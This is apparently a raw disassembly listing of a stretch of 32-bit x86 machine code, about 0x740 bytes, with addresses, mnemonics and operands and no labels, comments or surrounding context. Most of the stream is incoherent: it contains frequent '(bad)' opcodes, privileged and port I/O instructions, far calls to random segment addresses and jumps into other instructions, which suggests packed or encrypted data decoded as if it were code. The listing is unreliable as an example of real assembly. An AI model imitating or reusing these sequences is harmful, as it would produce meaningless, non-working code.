  41a71a:	rcl    DWORD PTR [esi-0x66],cl
  41a71d:	rol    bh,0xd
  41a720:	push   ecx
  41a721:	or     eax,0xcc79d738
  41a726:	addr16 jnp 0x41a76f
  41a729:	jbe    0x41a791
  41a72b:	mov    eax,0x3b60a5fe
  41a730:	mov    ah,BYTE PTR [ecx+0x9]
  41a733:	mov    al,0x26
  41a735:	lock lea esp,[ebx]
  41a738:	scas   eax,DWORD PTR es:[edi]
  41a739:	js     0x41a709
  41a73b:	dec    ecx
  41a73c:	int3   
  41a73d:	jne    0x41a72f
  41a73f:	sub    dh,ah
  41a741:	data16 jnp 0x41a727
  41a744:	leave  
  41a745:	mov    al,0x59
  41a747:	xor    edi,edx
  41a749:	loope  0x41a787
  41a74b:	fimul  WORD PTR [ebx-0x2d225431]
  41a751:	pop    edx
  41a752:	mov    dh,0x30
  41a754:	pop    ebp
  41a755:	cld    
  41a756:	scas   al,BYTE PTR es:[edi]
  41a757:	or     ah,0x88
  41a75a:	dec    edx
  41a75b:	lods   eax,DWORD PTR ds:[esi]
  41a75c:	xlat   BYTE PTR ds:[ebx]
  41a75d:	and    edi,DWORD PTR ds:0xbb75a9b5
  41a763:	xchg   BYTE PTR [edi-0x10],dh
  41a766:	xchg   esi,eax
  41a767:	jge    0x41a703
  41a769:	mov    ds:0xd03190b8,eax
  41a76e:	sub    eax,0xb7c80993
  41a773:	jle    0x41a7a7
  41a775:	mov    ecx,0xb60d626a
  41a77a:	add    bl,0x94
  41a77d:	scas   eax,DWORD PTR es:[edi]
  41a77e:	jb     0x41a725
  41a780:	loope  0x41a737
  41a782:	out    dx,al
  41a783:	gs gs int 0xf5
  41a787:	add    BYTE PTR [esi],0xbc
  41a78a:	iret   
  41a78b:	daa    
  41a78c:	rcl    DWORD PTR [edx],0xbc
  41a78f:	and    eax,0x4f48697b
  41a794:	dec    edx
  41a795:	sbb    esp,esp
  41a797:	mov    eax,ds:0xae7f5a69
  41a79c:	into   
  41a79d:	pop    ss
  41a79e:	jecxz  0x41a7cc
  41a7a0:	shr    DWORD PTR [edx],cl
  41a7a2:	rol    BYTE PTR [ecx+0x1c],0x7a
  41a7a6:	fs test al,0xa3
  41a7a9:	xor    eax,DWORD PTR [ecx-0x70320bd1]
  41a7af:	sbb    edi,DWORD PTR [eax+0x6]
  41a7b2:	add    DWORD PTR [esp+esi*1+0x2e],0x42
  41a7b7:	push   esp
  41a7b8:	push   esp
  41a7b9:	pop    esi
  41a7ba:	leave  
  41a7bb:	shl    BYTE PTR fs:[edx-0x6],cl
  41a7bf:	or     BYTE PTR [esi],bh
  41a7c1:	ret    0xad2
  41a7c4:	push   edi
  41a7c5:	adc    eax,0xdf5ef38c
  41a7ca:	jge    0x41a7b9
  41a7cc:	mov    ah,0x47
  41a7ce:	or     DWORD PTR [ebp-0x23ca12d5],esp
  41a7d4:	sbb    eax,0x6561062e
  41a7d9:	pop    ds
  41a7da:	xor    edi,DWORD PTR [ecx]
  41a7dc:	enter  0x1ecc,0xd
  41a7e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7e1:	sbb    eax,0xa7bb2a45
  41a7e6:	dec    ebp
  41a7e7:	push   ecx
  41a7e8:	mov    esp,DWORD PTR [ebp+0x6e0f4288]
  41a7ee:	cli    
  41a7ef:	dec    edx
  41a7f0:	aam    0x42
  41a7f2:	mov    ch,ah
  41a7f4:	(bad)  
  41a7f5:	mov    dl,0x58
  41a7f7:	and    DWORD PTR [edi+0x1388ca4c],ebp
  41a7fd:	and    al,0x99
  41a7ff:	xchg   BYTE PTR [ecx-0x3e],dh
  41a802:	mov    dl,0x53
  41a804:	cmc    
  41a805:	jnp    0x41a85b
  41a807:	and    DWORD PTR [esi],0xa0071704
  41a80d:	push   eax
  41a80e:	jb     0x41a7de
  41a810:	in     eax,0x6c
  41a812:	xchg   edi,eax
  41a813:	and    al,0xd5
  41a815:	mov    ch,0x3d
  41a817:	popf   
  41a818:	inc    ebp
  41a819:	aaa    
  41a81a:	ret    0x3f3d
  41a81d:	cmp    ebp,DWORD PTR [ebx-0x1d]
  41a820:	outs   dx,DWORD PTR ds:[esi]
  41a821:	in     eax,dx
  41a822:	sbb    BYTE PTR [edx+ecx*2],0x38
  41a826:	add    esi,ebp
  41a828:	xchg   edx,eax
  41a829:	pop    esi
  41a82a:	pop    ebp
  41a82b:	out    0x2e,eax
  41a82d:	inc    esi
  41a82e:	enter  0x5da4,0x18
  41a832:	rcr    dh,cl
  41a834:	(bad)  
  41a835:	stos   BYTE PTR es:[edi],al
  41a836:	cmc    
  41a837:	(bad)  
  41a838:	jns    0x41a824
  41a83a:	sbb    eax,0xacdc3d67
  41a83f:	mov    esp,0x23c59d43
  41a844:	lahf   
  41a845:	mov    eax,0xdca44c94
  41a84a:	rcl    DWORD PTR [ecx+ebp*2+0x62],cl
  41a84e:	xlat   BYTE PTR ds:[ebx]
  41a84f:	inc    ecx
  41a850:	(bad)  
  41a851:	or     DWORD PTR [ecx+edx*2+0x5c],0x92cd532f
  41a859:	add    al,0x3e
  41a85b:	mov    al,0x59
  41a85d:	ss xchg ebp,eax
  41a85f:	sbb    DWORD PTR [ecx*2-0x14e97f3f],0x320841bb
  41a86a:	or     ebp,DWORD PTR [esi]
  41a86c:	lea    ebp,[eax-0x6]
  41a86f:	mov    al,ds:0xb4b4e6bf
  41a874:	test   eax,0xcc7b421
  41a879:	jmp    0x41a86f
  41a87b:	scas   eax,DWORD PTR es:[edi]
  41a87c:	xchg   ebp,eax
  41a87d:	cwde   
  41a87e:	pop    esp
  41a87f:	(bad)  
  41a882:	jno    0x41a8d6
  41a884:	sbb    ah,BYTE PTR [edx-0x596502a1]
  41a88a:	test   al,0x85
  41a88c:	pop    esp
  41a88d:	int3   
  41a88e:	xchg   esi,eax
  41a88f:	sbb    cl,BYTE PTR [edx-0x497ba094]
  41a895:	mov    ds:0xeecf683e,al
  41a89a:	popa   
  41a89b:	mov    eax,0x94eb374b
  41a8a0:	jbe    0x41a86f
  41a8a2:	xchg   DWORD PTR [eax],esi
  41a8a4:	cdq    
  41a8a5:	add    BYTE PTR [edi+ebx*4+0x3b],ch
  41a8a9:	dec    ebx
  41a8aa:	inc    esp
  41a8ab:	loope  0x41a882
  41a8ad:	xchg   ebx,eax
  41a8ae:	mov    ds:0x4cfd6c49,eax
  41a8b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8b4:	aad    0x9b
  41a8b6:	mov    eax,ds:0x852cdc36
  41a8bb:	fwait
  41a8bc:	les    esi,FWORD PTR [ebp+0x269d0de7]
  41a8c2:	jns    0x41a8d0
  41a8c4:	dec    ebx
  41a8c5:	pop    ss
  41a8c6:	mov    bl,0x66
  41a8c8:	outs   dx,BYTE PTR ds:[esi]
  41a8c9:	mov    al,0x5
  41a8cb:	mov    ebx,gs
  41a8cd:	pop    ss
  41a8ce:	inc    eax
  41a8cf:	sar    DWORD PTR [ebp-0x2e],0x73
  41a8d3:	js     0x41a89c
  41a8d5:	xor    bh,BYTE PTR [ebx+esi*4-0x5a932a12]
  41a8dc:	aas    
  41a8dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8de:	(bad)  
  41a8df:	out    dx,eax
  41a8e0:	daa    
  41a8e1:	push   ebx
  41a8e2:	call   0xe95d083b
  41a8e7:	imul   edi,DWORD PTR [edx-0x63e64194],0xffffffcf
  41a8ee:	sbb    edx,edi
  41a8f0:	cmp    esp,esp
  41a8f2:	fisttp WORD PTR [esi+0x3f817d5a]
  41a8f8:	xlat   BYTE PTR ds:[ebx]
  41a8f9:	pop    ebp
  41a8fa:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41a8fc:	adc    eax,edi
  41a8fe:	xchg   DWORD PTR [ebx-0x7f],esp
  41a901:	jbe    0x41a95c
  41a903:	lock call 0xaf3b:0x7142ed73
  41a90b:	(bad)  
  41a90c:	cwde   
  41a90d:	mov    WORD PTR [edx+0x60f972e6],?
  41a913:	xchg   ebp,eax
  41a914:	mov    dl,BYTE PTR [esi]
  41a916:	aas    
  41a917:	push   cs
  41a918:	cmp    al,0xdb
  41a91a:	inc    ebx
  41a91b:	xchg   esp,eax
  41a91c:	cmp    al,0xd1
  41a91e:	arpl   di,cx
  41a920:	(bad)  
  41a921:	arpl   WORD PTR [edx+0x69b609e4],bp
  41a927:	sbb    al,0xde
  41a929:	dec    ebp
  41a92a:	xchg   ebp,eax
  41a92b:	dec    esi
  41a92c:	mov    edx,0xe93bc3a5
  41a931:	stos   BYTE PTR es:[edi],al
  41a932:	mov    BYTE PTR [esi+0x42],bl
  41a935:	jg     0x41a8f5
  41a937:	push   cs
  41a938:	sub    al,0x13
  41a93a:	(bad)  
  41a93b:	or     al,0x62
  41a93d:	out    0xa2,al
  41a93f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a940:	(bad)  
  41a941:	mov    eax,ds:0x89824b30
  41a946:	inc    esi
  41a947:	sbb    eax,0x45355da3
  41a94c:	sbb    esi,DWORD PTR [ecx]
  41a94e:	jp     0x41a915
  41a950:	dec    edx
  41a951:	cdq    
  41a952:	mov    esi,0xed9105e4
  41a957:	lds    edx,FWORD PTR [esi-0x78af6c38]
  41a95d:	ins    DWORD PTR es:[edi],dx
  41a95e:	sub    BYTE PTR [esi+eax*4+0x4ac1bc82],bh
  41a965:	push   eax
  41a966:	pop    ebx
  41a967:	push   0x41400a71
  41a96c:	jne    0x41a90b
  41a96e:	sti    
  41a96f:	(bad)  
  41a970:	sbb    DWORD PTR [esi],ecx
  41a972:	test   BYTE PTR [ecx],dh
  41a974:	cdq    
  41a975:	mov    ds:0x223d3d57,eax
  41a97a:	xor    DWORD PTR [ecx],0x28
  41a97d:	or     BYTE PTR [edi+0x29],cl
  41a980:	aaa    
  41a981:	clc    
  41a982:	mov    al,ds:0xaac30ccc
  41a987:	dec    edx
  41a988:	in     eax,0x7
  41a98a:	xor    eax,0xf253143a
  41a98f:	jno    0x41a9e3
  41a991:	xchg   edx,eax
  41a992:	fsubr  st(0),st
  41a994:	xchg   esi,eax
  41a995:	jb     0x41a9f2
  41a997:	or     ecx,edx
  41a999:	lds    edi,FWORD PTR [eax]
  41a99b:	nop
  41a99c:	xor    eax,eax
  41a99e:	push   esi
  41a99f:	test   DWORD PTR [edx],ebx
  41a9a1:	mov    esi,0x42075b8b
  41a9a6:	jp     0x41a9d6
  41a9a8:	rcr    DWORD PTR [eax-0x19a7d993],0x18
  41a9af:	jbe    0x41a969
  41a9b1:	adc    BYTE PTR [edx+ecx*8+0xd9e9ccf],ch
  41a9b8:	mov    esp,0x2a30c717
  41a9bd:	cmp    al,0x1f
  41a9bf:	xor    bl,BYTE PTR [esi]
  41a9c1:	(bad)  
  41a9c2:	jmp    0x7e904b
  41a9c7:	fmul   QWORD PTR [edx+0x3e6bdc1c]
  41a9cd:	aas    
  41a9ce:	sbb    cl,al
  41a9d0:	sub    eax,0xbc311e62
  41a9d5:	jp     0x41aa01
  41a9d7:	lods   eax,DWORD PTR ds:[esi]
  41a9d8:	xor    BYTE PTR [edx+0x3559669d],dl
  41a9de:	retf   
  41a9df:	popf   
  41a9e0:	dec    ecx
  41a9e1:	js     0x41aa2d
  41a9e3:	cmp    al,0x84
  41a9e5:	fidiv  DWORD PTR [edx]
  41a9e7:	ror    ah,cl
  41a9e9:	lahf   
  41a9ea:	jle    0x41a9aa
  41a9ec:	test   DWORD PTR [ecx-0x66ed6e7c],edi
  41a9f2:	jae    0x41a98c
  41a9f4:	pop    ebx
  41a9f5:	xchg   edx,ecx
  41a9f7:	mov    ecx,0x56c79f8d
  41a9fc:	clc    
  41a9fd:	jecxz  0x41a9cb
  41a9ff:	inc    esi
  41aa00:	push   edi
  41aa01:	sbb    DWORD PTR [edx-0x44],0x959f9252
  41aa08:	jo     0x41aa75
  41aa0a:	and    DWORD PTR [edx-0x42],edx
  41aa0d:	cwde   
  41aa0e:	dec    ecx
  41aa0f:	adc    al,0x84
  41aa11:	loope  0x41a9de
  41aa13:	push   esi
  41aa14:	pop    ecx
  41aa15:	adc    DWORD PTR [ebx],esi
  41aa17:	sub    ebx,edi
  41aa19:	es jnp 0x41aa8d
  41aa1c:	sbb    edx,DWORD PTR [esi+0x645fb0c3]
  41aa22:	out    dx,eax
  41aa23:	pop    es
  41aa24:	push   ss
  41aa25:	fwait
  41aa26:	in     eax,dx
  41aa27:	inc    edi
  41aa28:	or     esp,DWORD PTR [eax]
  41aa2a:	bound  edx,QWORD PTR [ebx]
  41aa2c:	adc    al,0xe8
  41aa2e:	scas   eax,DWORD PTR es:[edi]
  41aa2f:	fcom   DWORD PTR [ecx+0x4]
  41aa32:	and    al,0xbf
  41aa34:	shl    BYTE PTR [ecx],0x2e
  41aa37:	inc    esi
  41aa38:	ret    0xa7aa
  41aa3b:	mov    eax,gs
  41aa3d:	inc    esi
  41aa3e:	dec    edi
  41aa3f:	jg     0x41aabf
  41aa41:	lds    ebp,FWORD PTR [edx-0x80]
  41aa44:	xor    BYTE PTR [ebx+0x2b],0x8
  41aa48:	push   esp
  41aa49:	fisttp WORD PTR [esi-0x5]
  41aa4c:	mov    ebx,0x76dfdf65
  41aa51:	inc    edi
  41aa52:	icebp  
  41aa53:	jno    0x41aabb
  41aa55:	dec    ebx
  41aa56:	lods   al,BYTE PTR ds:[esi]
  41aa57:	out    0x63,eax
  41aa59:	mov    dh,0xc2
  41aa5b:	sbb    ecx,ecx
  41aa5d:	fidiv  DWORD PTR [ebp-0x106d31cd]
  41aa63:	into   
  41aa64:	gs call 0x5db5:0xc77b169c
  41aa6c:	pop    esi
  41aa6d:	(bad)  
  41aa6e:	div    DWORD PTR [edi+0x25]
  41aa71:	test   BYTE PTR [esi+0x267e086f],ch
  41aa77:	outs   dx,DWORD PTR ds:[esi]
  41aa78:	mov    ebx,ebp
  41aa7a:	sbb    BYTE PTR ds:0xc5fd0b37,bl
  41aa80:	or     BYTE PTR [ebp+0x70],bh
  41aa83:	fcmovnb st,st(5)
  41aa85:	(bad)  
  41aa86:	int    0x46
  41aa88:	sar    DWORD PTR [ebx],0x6e
  41aa8b:	push   ds
  41aa8c:	mov    ebp,0xec3d965a
  41aa91:	div    esi
  41aa93:	jle    0x41aa74
  41aa95:	mov    edx,DWORD PTR [edx+0x61ecbfa8]
  41aa9b:	test   ch,bh
  41aa9d:	pop    edx
  41aa9e:	push   cs
  41aa9f:	sbb    eax,0x5bd12bb
  41aaa4:	(bad)  
  41aaa5:	daa    
  41aaa6:	int3   
  41aaa7:	mov    eax,0xa8a23618
  41aaac:	push   0x76
  41aaae:	and    eax,DWORD PTR [edx-0x56bb4439]
  41aab4:	push   edi
  41aab5:	gs adc bl,ch
  41aab8:	frstor [ebx-0x1a]
  41aabb:	fsub   DWORD PTR [ecx-0x11]
  41aabe:	jo     0x41aa99
  41aac0:	(bad)  
  41aac1:	sbb    eax,0x4da05970
  41aac6:	(bad)  
  41aac7:	push   ss
  41aac8:	jnp    0x41ab2f
  41aaca:	fldcw  WORD PTR [edi+0x32cd36d1]
  41aad0:	mov    dl,0x3c
  41aad2:	dec    edx
  41aad3:	cmp    edi,eax
  41aad5:	mov    ebp,0xd1186649
  41aada:	scas   eax,DWORD PTR es:[edi]
  41aadb:	xor    esi,DWORD PTR [ebx+0x764ec2e]
  41aae1:	pusha  
  41aae2:	inc    edi
  41aae3:	cmp    eax,0x34b13a5d
  41aae8:	(bad)  
  41aae9:	jle    0x41aa7a
  41aaeb:	popa   
  41aaec:	icebp  
  41aaed:	xchg   BYTE PTR [edi],ah
  41aaef:	push   edi
  41aaf0:	addr16 out 0xab,eax
  41aaf3:	push   ds
  41aaf4:	call   0xa43afa5d
  41aaf9:	or     al,0x15
  41aafb:	mov    dl,0x53
  41aafd:	rcr    BYTE PTR [ebx+0x5d73510b],0x1d
  41ab04:	fs in  eax,dx
  41ab06:	fs cmp bh,dl
  41ab09:	lods   al,BYTE PTR ds:[esi]
  41ab0a:	lods   eax,DWORD PTR ds:[esi]
  41ab0b:	lock mov edx,0xdfe3f1f
  41ab11:	(bad)  
  41ab12:	cwde   
  41ab13:	or     cl,dl
  41ab15:	jl     0x41ab4b
  41ab17:	rcr    edx,1
  41ab19:	(bad)  
  41ab1b:	jge    0x41aad9
  41ab1d:	mov    BYTE PTR [eax-0x2622370f],0x7
  41ab24:	icebp  
  41ab25:	hlt    
  41ab26:	punpcklbw mm6,DWORD PTR [edx-0x4df9d356]
  41ab2d:	pop    edi
  41ab2e:	ficomp DWORD PTR [eax]
  41ab30:	mov    ah,0x96
  41ab32:	das    
  41ab33:	mov    ah,0xc3
  41ab35:	in     eax,0x89
  41ab37:	in     al,0xa1
  41ab39:	add    ah,BYTE PTR ss:[ecx]
  41ab3c:	ficom  DWORD PTR [ebp+0x5ef3fac1]
  41ab42:	and    al,0xe4
  41ab44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab45:	lea    edi,[ecx+ebx*4-0xe9567a7]
  41ab4c:	in     al,dx
  41ab4d:	in     al,0xae
  41ab4f:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab51:	and    eax,0x9920d8ad
  41ab56:	xchg   edi,eax
  41ab57:	ds inc ecx
  41ab59:	sub    dh,cl
  41ab5b:	pop    ebp
  41ab5c:	xor    eax,0xe125f908
  41ab61:	xchg   DWORD PTR [edi+0x2a],esi
  41ab64:	push   edi
  41ab65:	scas   eax,DWORD PTR es:[edi]
  41ab66:	test   DWORD PTR [edx-0x5909713],ebx
  41ab6c:	(bad)
  41ab6f:	jnp    0x41ab30
  41ab71:	mov    cl,0x6
  41ab73:	mov    ch,0x47
  41ab75:	inc    ecx
  41ab76:	jecxz  0x41ab58
  41ab78:	fbld   TBYTE PTR [esi-0x8d97ffc]
  41ab7e:	ins    BYTE PTR es:[edi],dx
  41ab7f:	ins    DWORD PTR es:[edi],dx
  41ab80:	fbld   TBYTE PTR [edi]
  41ab82:	test   BYTE PTR [esi],bl
  41ab84:	iret   
  41ab85:	xor    eax,0xa0da9ce3
  41ab8a:	call   0x2f03:0x4e8304bc
  41ab91:	cmp    DWORD PTR [ecx+0x229072ef],edx
  41ab97:	xlat   BYTE PTR ds:[ebx]
  41ab98:	pop    ds
  41ab99:	mov    dl,0x43
  41ab9b:	add    ch,cl
  41ab9d:	mov    al,ds:0x7d8c622c
  41aba2:	test   al,0x10
  41aba4:	push   edx
  41aba5:	out    dx,eax
  41aba6:	fist   DWORD PTR [edi+0x6d73f16e]
  41abac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abad:	dec    esi
  41abae:	mov    eax,ds:0xbd0835a0
  41abb3:	jl     0x41ab4a
  41abb5:	jns    0x41abe2
  41abb7:	adc    al,0x8
  41abb9:	xor    esi,DWORD PTR [edi-0x3cd56861]
  41abbf:	retf   0x25d7
  41abc2:	or     DWORD PTR [ebp-0x3c],edi
  41abc5:	outs   dx,BYTE PTR ds:[esi]
  41abc6:	out    dx,eax
  41abc7:	rol    BYTE PTR [edx],1
  41abc9:	sub    DWORD PTR [eax+0x10136ef1],0xffffffd4
  41abd0:	loop   0x41ac29
  41abd2:	adc    al,0xb8
  41abd4:	cli    
  41abd5:	mov    edi,0xfbf8e141
  41abda:	in     eax,dx
  41abdb:	test   BYTE PTR ds:0xf5354bf5,0xd4
  41abe2:	lock jp 0x41ac63
  41abe5:	and    BYTE PTR [eax+ebp*4-0x264bb84a],0xa0
  41abed:	xchg   ebp,eax
  41abee:	mov    WORD PTR [ecx+eax*1],es
  41abf1:	retf   
  41abf2:	fidiv  WORD PTR [esi]
  41abf4:	inc    esp
  41abf5:	lock sub al,0x8a
  41abf8:	sub    DWORD PTR [ebx],esi
  41abfa:	test   al,0xab
  41abfc:	pop    ecx
  41abfd:	loope  0x41abea
  41abff:	stos   BYTE PTR es:[edi],al
  41ac00:	test   al,0x27
  41ac02:	fbld   TBYTE PTR [ecx]
  41ac04:	(bad)  
  41ac05:	aas    
  41ac06:	xor    edi,DWORD PTR [edi-0x563fbf73]
  41ac0c:	daa    
  41ac0d:	inc    esp
  41ac0e:	mov    eax,ds:0xf529a398
  41ac13:	icebp  
  41ac14:	int3   
  41ac15:	mov    ch,0x69
  41ac17:	fwait
  41ac18:	jo     0x41abc7
  41ac1a:	and    ah,bh
  41ac1c:	test   BYTE PTR [esi+0xad2203c],cl
  41ac22:	aad    0x59
  41ac24:	in     al,0x82
  41ac26:	push   DWORD PTR [edi]
  41ac28:	lahf   
  41ac29:	and    edx,DWORD PTR [ebp+0x68bd2abc]
  41ac2f:	sbb    eax,0x999b812c
  41ac34:	sub    DWORD PTR [ebx],esp
  41ac36:	jo     0x41abba
  41ac38:	inc    ebx
  41ac39:	call   0x9b27:0x91999da2
  41ac40:	sbb    DWORD PTR [ebx],esp
  41ac42:	xchg   DWORD PTR [edx+0x4f0afee9],edi
  41ac48:	or     eax,0x8a6695a8
  41ac4d:	(bad)  
  41ac4e:	retf   
  41ac4f:	jmp    0xdae0f633
  41ac54:	test   DWORD PTR [edx+0x10a0f52],ecx
  41ac5a:	xor    ebp,DWORD PTR [edi+edx*2]
  41ac5d:	out    dx,al
  41ac5e:	cmp    cl,dh
  41ac60:	jne    0x41acc4
  41ac62:	shl    ebp,0xd1
  41ac65:	mov    BYTE PTR [eax-0x33ebd853],dl
  41ac6b:	aad    0x9c
  41ac6d:	pusha  
  41ac6e:	lahf   
  41ac6f:	dec    ecx
  41ac70:	iret   
  41ac71:	fld    DWORD PTR [edx]
  41ac73:	lods   al,BYTE PTR ds:[esi]
  41ac74:	stc    
  41ac75:	shl    DWORD PTR [edi+0x34146ccf],cl
  41ac7b:	das    
  41ac7c:	xor    esp,DWORD PTR ss:[ebp+0x16]
  41ac80:	(bad)  [ebx-0x25]
  41ac83:	stos   DWORD PTR es:[edi],eax
  41ac84:	ins    BYTE PTR es:[edi],dx
  41ac85:	dec    ebx
  41ac86:	sar    DWORD PTR [eax+0xf652986],cl
  41ac8c:	dec    edi
  41ac8d:	mov    edi,edi
  41ac8f:	mov    ebp,esi
  41ac91:	cmp    BYTE PTR [ebp+eiz*1-0x1],0x4b
  41ac96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac97:	add    ecx,edi
  41ac99:	into   
  41ac9a:	mov    cl,0xad
  41ac9c:	ret    0x7618
  41ac9f:	stos   BYTE PTR es:[edi],al
  41aca0:	pusha  
  41aca1:	push   ecx
  41aca2:	mov    bh,0x44
  41aca4:	lds    esi,FWORD PTR [eax-0x6d]
  41aca7:	fmul   QWORD PTR fs:[ecx]
  41acaa:	dec    DWORD PTR [esi+eiz*1+0x5d4eb374]
  41acb1:	push   esi
  41acb2:	mov    al,ds:0xe8754ca3
  41acb7:	dec    DWORD PTR [edx+0x1a]
  41acba:	std    
  41acbb:	inc    ebp
  41acbc:	cmp    dh,BYTE PTR [edi-0x7204aee5]
  41acc2:	mov    ah,0x95
  41acc4:	jge    0x41acc1
  41acc6:	icebp  
  41acc7:	inc    ebx
  41acc8:	xor    cl,BYTE PTR [ebp-0x51]
  41accb:	adc    dh,ch
  41accd:	rcl    DWORD PTR [ecx+0x1f9898a5],0xb3
  41acd4:	ss jp  0x41ad1d
  41acd7:	adc    bl,BYTE PTR ds:0xd2c1c87a
  41acdd:	xchg   ebx,eax
  41acde:	ins    DWORD PTR es:[edi],dx
  41acdf:	jle    0x41acfd
  41ace1:	aaa    
  41ace2:	stos   DWORD PTR es:[edi],eax
  41ace3:	gs js  0x41ad21
  41ace6:	sub    DWORD PTR [ecx-0x344f38c0],esp
  41acec:	test   bh,0xba
  41acef:	and    al,0x2a
  41acf1:	loopne 0x41ad17
  41acf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acf4:	stos   DWORD PTR es:[edi],eax
  41acf5:	stc    
  41acf6:	jg     0x41ace0
  41acf8:	xchg   ebp,eax
  41acf9:	sub    DWORD PTR [eax+0x367f5c9b],eax
  41acff:	push   es
  41ad00:	adc    dh,BYTE PTR [ebx*8+0x3e2a3db8]
  41ad07:	xchg   esp,eax
  41ad08:	jge    0x41acc8
  41ad0a:	mov    bh,0x91
  41ad0c:	xchg   DWORD PTR [eax+0x15],edi
  41ad0f:	dec    edi
  41ad10:	aaa    
  41ad11:	aas    
  41ad12:	sub    esp,DWORD PTR [edx-0x1d]
  41ad15:	xchg   ecx,eax
  41ad16:	pop    eax
  41ad17:	dec    ecx
  41ad18:	out    0x16,eax
  41ad1a:	cdq    
  41ad1b:	in     al,0x2
  41ad1d:	popa   
  41ad1e:	scas   al,BYTE PTR es:[edi]
  41ad1f:	(bad)  
  41ad20:	dec    ecx
  41ad21:	cwde   
  41ad22:	cmp    ebx,DWORD PTR [eax+0x5d3e7ae3]
  41ad28:	pop    edx
  41ad29:	(bad)  
  41ad2a:	outs   dx,DWORD PTR ds:[esi]
  41ad2b:	scas   eax,DWORD PTR es:[edi]
  41ad2c:	ffree  st(0)
  41ad2e:	fld    DWORD PTR [ebx+0xa]
  41ad31:	push   ebx
  41ad32:	pop    ebp
  41ad33:	call   0x9f5:0x3b9819ca
  41ad3a:	push   edi
  41ad3b:	xchg   ebx,eax
  41ad3c:	pop    ebp
  41ad3d:	xchg   ebx,eax
  41ad3e:	js     0x41acf9
  41ad40:	or     ch,BYTE PTR [esi]
  41ad42:	push   es
  41ad43:	mov    BYTE PTR [eax-0x146e6f30],dh
  41ad49:	cmp    ah,cl
  41ad4b:	jae    0x41acd7
  41ad4d:	mov    cl,BYTE PTR [ebp+0x70]
  41ad50:	ja     0x41ad1b
  41ad52:	mov    ecx,cs
  41ad54:	push   ebx
  41ad55:	hlt    
  41ad56:	push   edi
  41ad57:	push   esp
  41ad58:	inc    esi
  41ad59:	jb     0x41ad33
  41ad5b:	rcl    DWORD PTR [ecx],cl
  41ad5d:	(bad)  
  41ad5e:	repz or esp,DWORD PTR [edx-0x2843dc24]
  41ad65:	imul   ebx,DWORD PTR [ebx+0x76],0x61
  41ad69:	imul   esi,DWORD PTR [ebx],0xa
  41ad6c:	add    bh,BYTE PTR [ebp-0x39]
  41ad6f:	pop    ebx
  41ad70:	xor    edx,DWORD PTR [ebp-0x4c2ee165]
  41ad76:	ds xchg ebp,eax
  41ad78:	sub    al,0xb8
  41ad7a:	xor    edx,DWORD PTR [edi-0xc]
  41ad7d:	dec    edx
  41ad7e:	jmp    DWORD PTR [eax]
  41ad80:	aam    0x17
  41ad82:	or     ecx,DWORD PTR [esi]
  41ad84:	int3   
  41ad85:	test   BYTE PTR [ebx],bl
  41ad87:	neg    DWORD PTR [edi+0x8dde137]
  41ad8d:	loope  0x41ad9e
  41ad8f:	int    0xcb
  41ad91:	fwait
  41ad92:	inc    esp
  41ad93:	sbb    al,0xba
  41ad95:	sbb    ch,BYTE PTR [eax-0x5c]
  41ad98:	or     eax,0x89e8639e
  41ad9d:	sub    al,0xd6
  41ad9f:	adc    BYTE PTR [ebp+0x2170e94],dl
  41ada5:	mov    al,BYTE PTR [eax-0xe454c64]
  41adab:	cmovg  esp,DWORD PTR [eax+0x1ae01ddf]
  41adb2:	mov    eax,0x9b7740e0
  41adb7:	sbb    ecx,ecx
  41adb9:	add    eax,0x904b5d74
  41adbe:	dec    edx
  41adbf:	test   eax,0x932624bb
  41adc4:	pop    ecx
  41adc5:	xchg   ebx,eax
  41adc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adc7:	and    ch,BYTE PTR [ebp+0x67]
  41adca:	pusha  
  41adcb:	xor    al,0xd6
  41adcd:	test   BYTE PTR [edx+0x11fc1580],dl
  41add3:	out    dx,al
  41add4:	loope  0x41ae06
  41add6:	cmc    
  41add7:	add    DWORD PTR [esi],0xf4c29417
  41addd:	sub    BYTE PTR [ecx-0x2db8a203],0xd5
  41ade4:	mov    BYTE PTR [eax+0x24],bh
  41ade7:	jg     0x41ae56
  41ade9:	and    al,0xc3
  41adeb:	je     0x41adca
  41aded:	jno    0x41ae38
  41adef:	fidivr WORD PTR [eax-0x35]
  41adf2:	(bad)  
  41adf4:	pop    ds
  41adf5:	jle    0x41ae0b
  41adf7:	add    al,0xe8
  41adf9:	sbb    eax,edx
  41adfb:	xor    eax,0x7f8d5ba1
  41ae00:	jle    0x41ae23
  41ae02:	je     0x41ae11
  41ae04:	outs   dx,DWORD PTR ds:[esi]
  41ae05:	aaa    
  41ae06:	loop   0x41ae1d
  41ae08:	xor    eax,ecx
  41ae0a:	push   0x19c925ac
  41ae0f:	dec    edx
  41ae10:	es cs jg 0x41ae0f
  41ae14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae15:	cmc    
  41ae16:	push   0x21
  41ae18:	jno    0x41ae76
  41ae1a:	mov    dl,0xe1
  41ae1c:	xchg   edx,eax
  41ae1d:	xchg   DWORD PTR [eax+0x1],edi
  41ae20:	mov    ebp,0x31bed12d
  41ae25:	retf   
  41ae26:	shl    DWORD PTR [edi+0x452e2151],0x60
  41ae2d:	aad    0x2c
  41ae2f:	cld    
  41ae30:	je     0x41ae9f
  41ae32:	cld    
  41ae33:	and    DWORD PTR [eax-0x52f1e943],0x2292b8fe
  41ae3d:	and    DWORD PTR [ebx],esi
  41ae3f:	ds clc 
  41ae41:	mov    bl,0x6f
  41ae43:	vmaxpd ymm3,ymm1,ymm4
  41ae47:	and    eax,0x6f622796
  41ae4c:	enter  0x3ee1,0x5c
  41ae50:	fwait
  41ae51:	and    bh,0x2
  41ae54:	sub    edx,DWORD PTR [edx+0x4d]
  41ae57:	clc    
  41ae58:	popf   
  41ae59:	mov    dh,0x7c
  41ae5b:	scas   al,BYTE PTR es:[edi]
